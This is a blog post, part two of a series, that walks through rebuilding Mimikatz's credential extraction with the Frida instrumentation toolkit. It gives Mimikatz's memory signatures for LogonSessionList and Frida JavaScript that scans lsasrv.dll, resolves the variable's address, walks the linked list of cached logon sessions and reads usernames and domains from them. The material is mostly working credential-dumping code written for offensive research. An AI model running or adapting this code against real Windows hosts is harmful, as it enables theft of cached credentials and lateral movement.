---
title: Dumping Lsass with... Frida? (Part 2)
description: A blog about dynamic instrumentation of Lsass for fun and profit!
---

# Dumping Lsass with... Frida? (Part 2)

In the first chapter of this series, we stuck with Frida's core functionality - using its Interceptor module to hook and tamper with functions from *lsass.exe* and retrieve sensitive data passed to them. Our true goal, however, was to replicate the functionality of Mimikatz. To that end, let's have a look at how Mimikatz finds and decrypts credentials that have been cached in memory.

I found the following blogs very useful when I was trying to figure all this out:

- [XPN Infosec Blog - Exploring Mimikatz](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
- [Uncovering Mimikatz ‘msv’ and collecting credentials through PyKD](https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/)

If you are interested in exploring this subject further or get stuck on your own implementations, I recommend checking them out. And of course, none of this would be possible without the incredible tool that is Mimikatz, and the reverse engineering and development that gentilkiwi continues to do on it.

## Needles and Haystacks

Previously, we used Frida's Interceptor to attach to the *LsaApLogonUserEx2()* function and intercept credentials as they were passed to it. Having access to debugging functionality makes this an easy thing to do, but Mimikatz doesn't have that luxury. It needs to directly scan the memory allocated to the Lsass process, and somehow identify exactly where those credentials are stored. Only then can it actually begin parsing and decrypting those structures in memory.

We can look at the [Mimikatz source code](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c) to figure out exactly how it accomplishes this. The answer is simpler than you may think - a hardcoded set of signatures is used to scan memory for the regions we're interested in. These signatures are obviously platform-dependent and are liable to change between different versions of Windows, so Mimikatz keeps several on them on-hand. Here is an example from the Mimikatz source:

```c
#elif defined(_M_X64)
BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
```

We can use these precompiled signatures in our own code, although we could also deduce them ourselves with a little reverse engineering and a debugger such as IDA or WinDBG. We'll cover exactly how these signatures were found in more detail later. For now, all we need is a way to scan memory for a specific sequence of bytes, which happily Frida provides for us:

```javascript
var lsasrv = Process.getModuleByName("lsasrv.dll")
var sequence = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; 

Memory.scan(lsasrv.base, lsasrv.size, sequence, {
	onMatch(signature, size) {
		console.log("Found a match at " + signature);
	}
});
```

With that, we have a way to scan the memory space of *lsasrv.dll* for those specific sequences. Mimikatz uses these signatures to deduce the address of specific global variables that contain sensitive data, and that's what we're going to need to do as well.

## Finding LogonSessionList

The first global variable we're interested in is *lsasrv!LogonSessionList*. As the name implies, this is a linked list where every element represents a single credential cached in memory. The way Mimikatz finds this variable is clever; instead of trying to identify the variable itself in memory, it looks for an instruction in *lsasrv.dll* which dereferences the address of the variable. This instruction will look something like this:

```asm
lea rcx, [rip + 0x118061] ; LogonSessionList
```

Note that the address given in the instruction above is not an absolute address, but a %rip-relative offset (0x118061) which is calculated at runtime. We're scanning memory at runtime, though, so as long as we can find the offset, we can perform some simple pointer arithmetic to find the actual address of the variable.

This is where the signature comes in. When we identify this signature in memory at a given address, we can add a certain offset to it and get to that instruction. The exact process looks like this:

1. Find the address where the signature appears.
2. Add some predetermined offset to get to the instruction which dereferences *LogonSessionList*.
3. Skip the first 3 bytes, which are the opcodes, and read the %rip offset from the latter part of the instruction.
4. Find what %rip will be just after our target instruction, then add the offset to get the true address of *LogonSessionList*.

By following these four steps, it's possible to write a function in Frida which, when provided with a pointer and an offset, will find the dereferenced address:

```javascript
function findDereferencedAddress(ptr, offset) {
	// Given a pointer to some signature address and an offset, extract the target address from an instruction that dereferences it. 
	// This is used to identify the location of global variables in lsass memory by finding instructions that dereference them. 
	
	// Calculate the offset to the target instruction.
	var targetAddress = ptr.add(offset);
	var targetInstruction = Instruction.parse(targetAddress);
	
	// Target instruction should look something like this
	// <signature> + <offset>: lea rcx, [rip + 0x118061]
	// We need to extract the %rip offset and resolve it into an actual address.
	
	// Sanity check for the lea instruction
	if (targetInstruction.toString().includes("lea ")) {
		// The first 3 bytes of the instruction are the opcodes, so skip those.
		var addrSize = targetInstruction.size - 3;
		// Extract the address being dereferenced by the LEA instruction, which is a %rip offset.
		var ripOffsetByteArray = targetAddress.add(3).readByteArray(addrSize);
		// Now we convert the byte array (i.e. "ef be ad de 00") to an address ("0xdeadbeef").
		var ripOffsetInt = new Uint32Array(ripOffsetByteArray)[0];
		var ripOffset = new NativePointer(ripOffsetInt);
		// Finally, we need to convert the offset into an actual address.
		// To do this, find what RIP will be just after our target instruction, then add the offset.
		var rip = targetAddress.add(targetInstruction.size);
		var target = rip.add(ripOffset);
		return target;
	}
}
```

Using this function, we can update our memory scanner from before to find the LogonSessionList variable:

```javascript
var lsasrv = Process.getModuleByName("lsasrv.dll")
var sequence = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; //offset is 0x14

Memory.scan(lsasrv.base, lsasrv.size, sequence, {
	onMatch(signature, size) {
		var logonSessionList = findDereferencedAddress(signature, 0x14);
		console.log("LogonSessionList is at " + logonSessionList);
	}
});
```

Testing this against our 64-bit Windows 10 VM, we can see that we're able to successfully identify the address of *LogonSessionList*:

![Frida output demonstrating the address of LogonSessionList](/img/finding-logonsessionlist.png)

## Parsing LogonSessionList

Now we're getting underway - with no hooking or symbol enumeration required, we've got a pointer to the *LogonSessionList* variable. But before we can convert this into actionable credential material, we need to parse it. Once again, the Mimikatz source code comes to our rescue here - these are undocumented structures, but gentilkiwi's code includes [implementations for many of them](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h). For this specific case - Windows 10 on x64 - we will want to use *_KIWI_MSV1_0_LIST_63*:

```c
typedef struct _KIWI_MSV1_0_LIST_63 {
	struct _KIWI_MSV1_0_LIST_63 *Flink;	//off_2C5718
	struct _KIWI_MSV1_0_LIST_63 *Blink; //off_277380
	PVOID unk0; // unk_2C0AC8
	ULONG unk1; // 0FFFFFFFFh
	PVOID unk2; // 0
	ULONG unk3; // 0
	ULONG unk4; // 0
	ULONG unk5; // 0A0007D0h
	HANDLE hSemaphore6; // 0F9Ch
	PVOID unk7; // 0
	HANDLE hSemaphore8; // 0FB8h
	PVOID unk9; // 0
	PVOID unk10; // 0
	ULONG unk11; // 0
	ULONG unk12; // 0 
	PVOID unk13; // unk_2C0A28
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align)
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PKIWI_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;
```

Looking at this data structure, we can see that the first order of business will be to enumerate the address of each cached session. The *Flink* variable, a pointer to the next element in the list, is the very first element, so this is an easy job:

```javascript
function getLogonSessions(ptr, max) {
	// Given a pointer to lsasrv!LogonSessionList, enumerate the address of all logon sessions that it contains.
	// LogonSessionList is a simple linked list, so the first element of each entry is a pointer to the next one.
	var sessions = [];
	var current = ptr;
	
	for (var i = 0; i < max; i++) {
		sessions.push(current.toString());
		current = current.readPointer();
		if (sessions.includes( current.toString() )) {
			i = max
		}
	}
	
	return sessions;
}
```

This will allow us to turn our pointer to *LogonSessionList* into an array of pointers, each pointing to a specific session. Now we need to parse the actual data out of them. This may seem intimidating when you look at the enormous struct that gentilkiwi has implemented and its many members, but we only actually care about a few bits of information: the *UserName*, *DomainName* and *Credentials* variables.

The *UserName* and *DomainName* are simple. They are both of type *UNICODE_STRING*, and we've dealt with those before. It's trivial to write a simple parser to extract each value:

```javascript
function getUsernameFromLogonSession(ptr) {
	// Given a pointer to a LogonSession, extract the username (a UNICODE_STRING).
	var usernamePtr = ptr.add(0x90);
	var len = usernamePtr.readUShort();
	var usernameBuffer = usernamePtr.add(0x8).readPointer();
	var username = usernameBuffer.readUtf16String(len);
	return username;
	
}

function getDomainFromLogonSession(ptr) {
	// Given a pointer to a LogonSession, extract the domain (a UNICODE_STRING).
	var domainPtr = ptr.add(0xa0);
	var len = domainPtr.readUShort();
	var domainBuffer = domainPtr.add(0x8).readPointer();
	var domain = domainBuffer.readUtf16String(len);
	return domain;
}
```
